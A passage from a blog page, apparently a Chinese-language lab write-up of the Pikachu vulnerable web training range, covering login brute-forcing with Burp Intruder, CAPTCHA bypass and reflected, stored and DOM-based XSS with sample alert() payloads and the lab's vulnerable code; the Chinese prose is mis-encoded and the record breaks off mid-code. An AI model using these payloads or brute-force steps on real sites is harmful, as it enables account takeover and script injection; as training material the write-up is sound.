<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pikachué¶åœºæ¼æ´å¤ç°è®°å½• | T0mrvvi1b3tâ€˜s blog</title><meta name="author" content="T0mrvvi1b3t"><meta name="copyright" content="T0mrvvi1b3t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="æš´åŠ›ç ´è§£åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£ bpæŠ“åŒ…ï¼Œå‘é€åˆ° Intruderæ¨¡å—ï¼ˆå¿«æ·é”®ctrl+i    ä¹‹åç‚¹å‡»å³ä¸Šè§’ start attackï¼ˆå¼€å§‹çˆ†ç ´  éªŒè¯ç ç»•è¿‡éªŒè¯ç çš„éªŒè¯æµç¨‹ä¸€èˆ¬ä¸ºï¼š  å®¢æˆ·ç«¯ç™»é™†é¡µé¢ï¼Œåå°ç”ŸæˆéªŒè¯ç ï¼šåå°ä½¿ç”¨ç®—æ³•ç”Ÿæˆå›¾ç‰‡ï¼Œå¹¶å°†å›¾ç‰‡è¿”å›åˆ°å®¢æˆ·ç«¯ï¼›åŒæ—¶å°†ç®—æ³•ç”Ÿæˆçš„å€¼å…¨å±€èµ‹å€¼å­˜åˆ°SESSIONä¸­ã€‚ æ ¡éªŒéªŒè¯ç ï¼šå®¢æˆ·ç«¯å°†è®¤è¯ä¿¡æ¯å’ŒéªŒè¯ç ä¸€åŒæäº¤ï¼›åå°å¯¹æäº¤çš„éªŒè¯ç ä¸SESSIONä¸­çš„">
<meta property="og:type" content="article">
<meta property="og:title" content="Pikachué¶åœºæ¼æ´å¤ç°è®°å½•">
<meta property="og:url" content="http://t0mrvvi1b3t.top/2021/05/18/pikachu/index.html">
<meta property="og:site_name" content="T0mrvvi1b3tâ€˜s blog">
<meta property="og:description" content="æš´åŠ›ç ´è§£åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£ bpæŠ“åŒ…ï¼Œå‘é€åˆ° Intruderæ¨¡å—ï¼ˆå¿«æ·é”®ctrl+i    ä¹‹åç‚¹å‡»å³ä¸Šè§’ start attackï¼ˆå¼€å§‹çˆ†ç ´  éªŒè¯ç ç»•è¿‡éªŒè¯ç çš„éªŒè¯æµç¨‹ä¸€èˆ¬ä¸ºï¼š  å®¢æˆ·ç«¯ç™»é™†é¡µé¢ï¼Œåå°ç”ŸæˆéªŒè¯ç ï¼šåå°ä½¿ç”¨ç®—æ³•ç”Ÿæˆå›¾ç‰‡ï¼Œå¹¶å°†å›¾ç‰‡è¿”å›åˆ°å®¢æˆ·ç«¯ï¼›åŒæ—¶å°†ç®—æ³•ç”Ÿæˆçš„å€¼å…¨å±€èµ‹å€¼å­˜åˆ°SESSIONä¸­ã€‚ æ ¡éªŒéªŒè¯ç ï¼šå®¢æˆ·ç«¯å°†è®¤è¯ä¿¡æ¯å’ŒéªŒè¯ç ä¸€åŒæäº¤ï¼›åå°å¯¹æäº¤çš„éªŒè¯ç ä¸SESSIONä¸­çš„">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg">
<meta property="article:published_time" content="2021-05-18T12:28:23.541Z">
<meta property="article:modified_time" content="2021-05-24T12:39:02.478Z">
<meta property="article:author" content="T0mrvvi1b3t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069584450-13.jpg"><link rel="canonical" href="http://t0mrvvi1b3t.top/2021/05/18/pikachu/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":false,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“","cht_to_chs":"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“","day_to_night":"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-05-24 20:39:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">T0mrvvi1b3tâ€˜s blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pikachué¶åœºæ¼æ´å¤ç°è®°å½•</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2021-05-18T12:28:23.541Z" title="å‘è¡¨äº 2021-05-18 20:28:23">2021-05-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2021-05-24T12:39:02.478Z" title="æ›´æ–°äº 2021-05-24 20:39:02">2021-05-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">é¶åœºæ¼æ´å¤ç°</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/web%E5%AD%A6%E4%B9%A0/">webå­¦ä¹ </a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pikachué¶åœºæ¼æ´å¤ç°è®°å½•"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h1><h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2><p><img src="https://img.vim-cn.com/85/6ce77643b8f836338a671fc2d48cfc8af9e0bb.png"></p>
<p>bpæŠ“åŒ…ï¼Œå‘é€åˆ° Intruderæ¨¡å—ï¼ˆå¿«æ·é”®ctrl+i</p>
<p><img src="https://img.vim-cn.com/c2/f54ad79a6cac76cc51be54a00efa92becd6330.png" alt="1"></p>
<p><img src="https://img.vim-cn.com/45/5c65c441cf3a0d43e4b0ec9c2b2e2700940053.png" alt="2"></p>
<p><img src="https://img.vim-cn.com/1b/9b560a9e5d0b9ec16a2a6d02a11a804eb111e7.png" alt="3"></p>
<p>ä¹‹åç‚¹å‡»å³ä¸Šè§’ start attackï¼ˆå¼€å§‹çˆ†ç ´</p>
<p><img src="https://img.vim-cn.com/8c/ca0eff454fbaa4d9dfb4500a4fe694c4a23529.png" alt="4"></p>
<h2 id="éªŒè¯ç ç»•è¿‡"><a href="#éªŒè¯ç ç»•è¿‡" class="headerlink" title="éªŒè¯ç ç»•è¿‡"></a>éªŒè¯ç ç»•è¿‡</h2><p>éªŒè¯ç çš„éªŒè¯æµç¨‹ä¸€èˆ¬ä¸ºï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯ç™»é™†é¡µé¢ï¼Œåå°ç”ŸæˆéªŒè¯ç ï¼šåå°ä½¿ç”¨ç®—æ³•ç”Ÿæˆå›¾ç‰‡ï¼Œå¹¶å°†å›¾ç‰‡è¿”å›åˆ°å®¢æˆ·ç«¯ï¼›åŒæ—¶å°†ç®—æ³•ç”Ÿæˆçš„å€¼å…¨å±€èµ‹å€¼å­˜åˆ°SESSIONä¸­ã€‚</li>
<li>æ ¡éªŒéªŒè¯ç ï¼šå®¢æˆ·ç«¯å°†è®¤è¯ä¿¡æ¯å’ŒéªŒè¯ç ä¸€åŒæäº¤ï¼›åå°å¯¹æäº¤çš„éªŒè¯ç ä¸SESSIONä¸­çš„è¿›è¡Œæ¯”è¾ƒï¼›</li>
<li>å®¢æˆ·ç«¯é‡æ–°åˆ·æ–°é¡µé¢ï¼Œå†æ¬¡ç”Ÿæˆæ–°çš„éªŒè¯ç ï¼šéªŒè¯ç ç®—æ³•ä¸­ä¸€èˆ¬åŒ…å«éšæœºå‡½æ•°ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ”¹å˜ã€‚</li>
</ol>
<p>åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£çš„æ–¹æ³•ï¼š</p>
<p>è´¦å·å¯†ç éšä¾¿è¾“ï¼Œæ¯”è¾ƒæ˜¯å¦è¾“å…¥éªŒè¯ç ä¸¤ç§æƒ…å†µç³»ç»Ÿçš„æç¤ºã€‚</p>
<p>å½“æˆ‘ä»¬ä¸è¾“å…¥éªŒè¯ç æ—¶ï¼Œä¼šæé†’æˆ‘ä»¬è¾“å…¥éªŒè¯ç ï¼›</p>
<p>å½“è¾“å…¥é”™è¯¯çš„éªŒè¯ç æ—¶ï¼Œä¼šæé†’éªŒè¯ç é”™è¯¯ã€‚æ¥ä¸‹æ¥è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œæç¤ºç”¨æˆ·åæˆ–è€…å¯†ç ä¸å­˜åœ¨</p>
<h3 id="on-client"><a href="#on-client" class="headerlink" title="on client"></a>on client</h3><p>å¸¸è§é—®é¢˜ï¼š</p>
<ul>
<li>ä½¿ç”¨å‰ç«¯jsæ¥å®ç°éªŒè¯ç ã€‚</li>
<li>å°†éªŒè¯ç åœ¨cookieä¸­æ³„éœ²ï¼Œå®¹æ˜“è¢«è·å–ã€‚</li>
<li>å°†éªŒè¯ç åœ¨å‰ç«¯æºä»£ç ä¸­æ³„éœ²ï¼Œå®¹æ˜“è¢«è·å–ã€‚</li>
</ul>
<p><img src="https://img.vim-cn.com/3d/803d8b914ab679933e2b8d3a994db413aa5376.png"></p>
<p>æŠ“åŒ…å‘é€åˆ°Intruderæ¨¡å—ï¼Œåªå°†ç”¨æˆ·åå’Œå¯†ç è®¾ç½®ä¸ºå˜é‡ï¼ŒéªŒè¯ç ä¸ºæ­£ç¡®éªŒè¯ç ï¼Œå¼€å§‹çˆ†ç ´å³å¯</p>
<h3 id="on-server"><a href="#on-server" class="headerlink" title="on server"></a>on server</h3><p>å¸¸è§é—®é¢˜ï¼š</p>
<ul>
<li>éªŒè¯ç åœ¨åå°ä¸è¿‡æœŸï¼Œå¯¼è‡´é•¿æ—¶é—´å¯ä»¥è¢«ä½¿ç”¨**.**</li>
<li>éªŒè¯ç æ ¡éªŒä¸ä¸¥æ ¼ï¼Œé€»è¾‘å‡ºç°é—®é¢˜**.**</li>
<li>éªŒè¯ç è®¾è®¡çš„å¤ªè¿‡ç®€å•å’Œæœ‰è§„å¾‹ï¼Œå®¹æ˜“è¢«çŒœæµ‹**.**</li>
</ul>
<p><img src="https://img.vim-cn.com/6d/74697edb57355f3f95a65903924ebb9e560d2f.png"></p>
<p>ç¡®è®¤éªŒè¯ç çš„æœ‰æ•ˆæ€§ã€‚å½“ä¸è¾“å…¥éªŒè¯ç æˆ–è€…è¾“å…¥éªŒè¯ç é”™è¯¯æ—¶ï¼Œæç¤ºéªŒè¯ç ä¸èƒ½ä¸ºç©ºæˆ–éªŒè¯ç é”™è¯¯</p>
<p>æŠ“åŒ…å‘é€åˆ°repeateræ¨¡å—ä¸­ä¿®æ”¹éªŒè¯ç çš„å€¼ï¼Œåˆ¤æ–­åå°å¯¹éªŒè¯ç æ˜¯å¦éªŒè¯ï¼Œå‘ç°å­˜åœ¨éªŒè¯</p>
<p>ä½¿ç”¨æ­£ç¡®éªŒè¯ç ï¼Œè¿”å›ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œä¿®æ”¹ç”¨æˆ·åæˆ–å¯†ç çš„å€¼å†æ¬¡å‘é€ï¼Œå‘ç°ä»æç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œå¾—åˆ°ç»“è®ºï¼ŒéªŒè¯ç å­˜åœ¨ä¸è¿‡æœŸçš„é—®é¢˜æ¥ä¸‹æ¥å°±ç›´æ¥å°†ç”¨æˆ·åå¯†ç è®¾ä¸ºå˜é‡çˆ†ç ´å°±å¯ä»¥äº†</p>
<h1 id="Cross-Site-Scripting-â€“-XSS"><a href="#Cross-Site-Scripting-â€“-XSS" class="headerlink" title="Cross-Site Scripting â€“ XSS"></a>Cross-Site Scripting â€“ XSS</h1><p>å±å®³ï¼šå­˜å‚¨å‹ &gt; åå°„å‹ &gt; DOMå‹</p>
<p>ç”¨æˆ·è®¿é—®å«æœ‰xssæ¼æ´çš„ç½‘ç«™ï¼Œè§¦å‘è„šæœ¬ï¼Œç½‘ç«™è¿”å›ç”¨æˆ·å¸¦æœ‰æ¶æ„ä»£ç çš„é¡µé¢ï¼Œæ‰§è¡Œè„šæœ¬ï¼Œå°†æ•°æ®è¿”å›ç»™æ”»å‡»è€…ï¼Œæ”»å‡»è€…å¯ç”¨ä¼ªé€ ç”¨æˆ·è¿›è¡Œä¸€äº›æ“ä½œ</p>
<p>åå°„å‹ï¼šä¸€æ¬¡æ€§</p>
<p>å­˜å‚¨å‹ï¼šæ¶æ„ä»£ç å­˜å‚¨åœ¨æ•°æ®åº“é‡Œè¾¹ï¼Œå¸¸è§äºç•™è¨€æ¿ï¼Œæ³¨å†Œé¡µé¢ç­‰ç­‰</p>
<p>DOMå‹ï¼šä¸ä¸åå°æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œé€šè¿‡DOMæ“ä½œå‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜ï¼Œä¸€æ¬¡æ€§ï¼Œç±»ä¼¼åå°„å‹</p>
<p>è¿›è¡Œæµ‹è¯•XSSæ¼æ´æ—¶ï¼Œå¯ä»¥å…ˆä¼ å…¥ä¸€äº›å­—ç¬¦æ¥åˆ¤æ–­æ˜¯å¦å¯¹è¾“å…¥æœ‰è¿‡æ»¤</p>
<h2 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss( get )"></a>åå°„å‹xss( get )</h2><p><img src="https://img.vim-cn.com/f4/4872bdf2a3aca7f0bfcd4df92c5ae27fc00f48.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯¹è¾“å…¥é•¿åº¦æœ‰é™åˆ¶ï¼Œä¿®æ”¹é•¿åº¦é™åˆ¶ï¼Œå†æ¬¡è¾“å…¥ï¼Œå³å¯è§¦å‘å¼¹çª—.</p>
<p><img src="https://img.vim-cn.com/5d/c54793f8b28a1d956094381770e11ffa1ebccb.png"></p>
<h2 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="headerlink" title="åå°„å‹xss( post )"></a>åå°„å‹xss( post )</h2><p><img src="https://img.vim-cn.com/34/df3d0fe9d4b389dab6ca80989d1b1ed91e6e78.png"></p>
<p>ç”¨bpæŠ“åŒ…ï¼Œçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼ˆä¹Ÿå¯ç‚¹å‡»å³ä¸Šè§’æç¤ºï¼‰ç™»é™†ä¹‹å</p>
<p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å¯è§¦å‘å¼¹çª—</p>
<h2 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h2><p><img src="https://img.vim-cn.com/c0/5287300170534ff4c119a872a8b485305fcae8.png"></p>
<p>payloadğŸ‘‡</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><p><img src="https://img.vim-cn.com/da/028a359d0666622deed8532129730b5b1c9c54.png"></p>
<p><img src="https://img.vim-cn.com/ff/9da34465c173f02d6012738a899ff77cc7a8f8.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">         document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//è¯•è¯•ï¼š&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">      <span class="comment">//è¯•è¯•ï¼š&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span></span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;!--&lt;a href=<span class="string">&quot;&quot;</span> onclick=(<span class="string">&#x27;xss&#x27;</span>)&gt;--&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> type=<span class="string">&quot;text&quot;</span>  value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;button&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span> /&gt;</span><br><span class="line">   &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;        </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°åªéœ€è¦æŠŠ<code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;</code>é—­åˆäº†ï¼Œæ„é€ payloadğŸ‘‡</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //åªéœ€è¦ç‚¹å‡»å¯¹åº”çš„é“¾æ¥å³å¯è§¦å‘å¼¹çª—</span><br><span class="line"></span><br><span class="line">&quot;&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> //å°†é¼ æ ‡ç§»åˆ°å¯¹åº”ä½ç½®å³å¯è§¦å‘å¼¹çª—</span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //ç›´æ¥åœ¨aæ ‡ç­¾é‡Œæ·»åŠ onclickäº‹ä»¶</span><br></pre></td></tr></table></figure>

<h2 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h2><p><img src="https://img.vim-cn.com/e0/b1735fd25bd029c088bf046c3b5540bd6e7330.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;xssd_main&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      function domxss()&#123;</span><br><span class="line">         var str &#x3D; window.location.search;</span><br><span class="line">         var txss &#x3D; decodeURIComponent(str.split(&quot;text&#x3D;&quot;)[1]);</span><br><span class="line">         var xss &#x3D; txss.replace(&#x2F;\+&#x2F;g,&#39; &#39;);</span><br><span class="line">&#x2F;&#x2F;       alert(xss);</span><br><span class="line"></span><br><span class="line">         document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+xss+&quot;&#39;&gt;å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F;è¯•è¯•ï¼š&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br><span class="line">      &#x2F;&#x2F;è¯•è¯•ï¼š&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;!--&lt;a href&#x3D;&quot;&quot; onclick&#x3D;(&#39;xss&#39;)&gt;--&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;text&quot; name&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot;  value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;è¯·è¯´å‡ºä½ 